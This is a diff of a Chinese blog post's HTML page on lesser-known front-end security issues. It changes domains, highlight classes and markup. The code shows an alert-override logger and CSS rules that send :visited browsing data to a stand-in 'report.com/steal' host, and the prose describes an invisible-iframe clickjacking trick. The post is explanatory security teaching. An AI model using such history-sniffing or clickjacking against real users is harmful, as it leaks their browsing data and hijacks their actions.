@@ -21,7 +21,7 @@
   <meta name="keywords" content="web,前端,冷门">
   <meta property="og:type" content="article">
   <meta property="og:title" content="那些前端安全冷门知识">
-  <meta property="og:url" content="http://meng.uno/articles/23b9d6e9/index.html">
+  <meta property="og:url" content="http://www.meng.uno/articles/23b9d6e9/index.html">
   <meta property="og:site_name" content="欢迎来到匡盟盟的博客！">
   <meta property="og:description" content="零、概述 提起web前端安全，大家都会想到两个名词：xss和csrf。 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。  大概分为以下章节：  盗取无法用js读写的Cookie 删不掉的本地存储  函数覆写监听上报  内存Cookie与硬盘Cookie  CSS带来的点击量泄露  JSONP回调函数与UTF-7编码  过滤与代码混淆  心理学与社会工程学   资料">
   <meta property="og:locale" content="zh-CN">
@@ -117,7 +117,7 @@
 
 
 
-  <link rel="canonical" href="http://meng.uno/articles/23b9d6e9/" />
+  <link rel="canonical" href="http://www.meng.uno/articles/23b9d6e9/" />
 
   <link rel="stylesheet" href="/css/animate.css">
   <link rel="stylesheet" href="/css/loading.css">
@@ -269,7 +269,7 @@
 	<span id="busuanzi_container_page_pv">
 		阅读量<span id="busuanzi_value_page_pv"></span>
 	</span>
-	<span class="post-count"> | 字数2,718</span>
+	<span class="post-count"> | 字数2,719</span>
 	<span class="post-count"> | 预计时间10分钟</span>
 	</a>
               </div>
@@ -292,14 +292,14 @@
                 <p>资料略多，文章较长，请自备瓜子…</p>
                 <h1>一、盗取无法用js读写的Cookie</h1>
                 <p>为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。</p>
-                <figure class="highlight lsl">
+                <figure class="highlight plain">
                   <table>
                     <tr>
                       <td class="gutter">
                         <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                       </td>
                       <td class="code">
-                        <pre><span class="line">setcookie(<span class="string">"test"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="number">0</span>); <span class="comment">// 设置普通Cookie</span></span><br><span class="line">setcookie(<span class="string">"test_http"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="number">0</span>, <span class="number">1</span>);<span class="comment">// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启</span></span><br></pre>
+                        <pre><span class="line">setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookie</span><br><span class="line">setcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启</span><br></pre>
                       </td>
                     </tr>
                   </table>
@@ -332,14 +332,14 @@
                 <p>该API利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。</p>
                 <h1>四、函数覆写监听上报</h1>
                 <p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。</p>
-                <figure class="highlight javascript">
+                <figure class="highlight plain">
                   <table>
                     <tr>
                       <td class="gutter">
                         <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                       </td>
                       <td class="code">
-                        <pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">    img.src = <span class="string">"http://yousite.com/log.php?caller="</span> + <span class="built_in">encodeURIComponent</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> _alert = alert;</span><br><span class="line"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    log(alert.caller);</span><br><span class="line">    _alert(s);</span><br><span class="line">&#125;</span><br></pre>
+                        <pre><span class="line">function log(s) &#123;</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);</span><br><span class="line">&#125;</span><br><span class="line">var _alert = alert;</span><br><span class="line">window.alert = function(s) &#123;</span><br><span class="line">    log(alert.caller);</span><br><span class="line">    _alert(s);</span><br><span class="line">&#125;</span><br></pre>
                       </td>
                     </tr>
                   </table>
@@ -359,27 +359,27 @@
                 <p>在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。<br> 假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。
                   <br> 试想这是一个
                   <code>导航栏组件</code>，html代码是这样的：</p>
-                <figure class="highlight routeros">
+                <figure class="highlight plain">
                   <table>
                     <tr>
                       <td class="gutter">
                         <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                       </td>
                       <td class="code">
-                        <pre><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"http://yousite.com/a1"</span> <span class="attribute">id</span>=<span class="string">"a1"</span>&gt;nav1&lt;/a&gt;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"http://yousite.com/a2"</span> <span class="attribute">id</span>=<span class="string">"a2"</span>&gt;nav2&lt;/a&gt;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"http://yousite.com/a3"</span> <span class="attribute">id</span>=<span class="string">"a3"</span>&gt;nav3&lt;/a&gt;</span><br></pre>
+                        <pre><span class="line">&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt;</span><br></pre>
                       </td>
                     </tr>
                   </table>
                 </figure>
                 <p>你忽略掉的css写成这样：</p>
-                <figure class="highlight css">
+                <figure class="highlight plain">
                   <table>
                     <tr>
                       <td class="gutter">
                         <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                       </td>
                       <td class="code">
-                        <pre><span class="line"><span class="selector-id">#a1</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://report.com/steal?data=a1);&#125;</span><br><span class="line"><span class="selector-id">#a2</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://report.com/steal?data=a2);&#125;</span><br><span class="line"><span class="selector-id">#a3</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://report.com/steal?data=a3);&#125;</span><br></pre>
+                        <pre><span class="line">#a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;</span><br><span class="line">#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;</span><br><span class="line">#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125;</span><br></pre>
                       </td>
                     </tr>
                   </table>
@@ -431,7 +431,7 @@
                 </p>
                 <p>有人会问，这不是CSRF吗？还真不是。做法却很简单：</p>
                 <p>“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。</p>
-                <p><br><br>本文链接： <a href="http://meng.uno/articles/23b9d6e9/">http://meng.uno/articles/23b9d6e9/</a> 欢迎转载！</p>
+                <p><br><br>本文链接： <a href="http://www.meng.uno/articles/23b9d6e9/">http://www.meng.uno/articles/23b9d6e9/</a> 欢迎转载！</p>
 
               </div>
               <footer class="article-footer">
@@ -568,7 +568,7 @@
 
         <div class="container">
           <div class="row">
-            <p id="copyRightEn">&copy; 2018.02.08 - 2018.03.25 <a href="http://www.meng.uno/">匡盟盟</a>&nbsp;<i class="fas fa-cogs"></i> 保留所有权利！</p>
+            <p id="copyRightEn">&copy; 2018.02.08 - 2018.03.26 <a href="http://www.meng.uno/">匡盟盟</a>&nbsp;<i class="fas fa-cogs"></i> 保留所有权利！</p>
 
             <p class="busuanzi_uv">
 
